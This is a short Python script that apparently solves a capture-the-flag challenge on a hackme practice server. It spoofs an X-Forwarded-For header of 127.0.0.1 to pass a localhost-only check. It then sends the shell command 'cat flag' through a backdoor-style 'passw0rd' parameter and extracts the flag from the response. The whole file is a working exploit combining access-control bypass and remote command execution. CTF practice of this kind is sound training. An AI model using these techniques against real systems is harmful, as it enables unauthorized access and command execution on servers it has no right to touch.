import re

import requests

url = 'https://wp.hackme.inndy.tw/'
headers = {
    'X-Forwarded-For': '127.0.0.1'
}
params = {
    'passw0rd': 'cat flag'
}

r = requests.get(url, headers=headers, params=params)
print(re.search('FLAG{.*}', r.content.decode()).group())
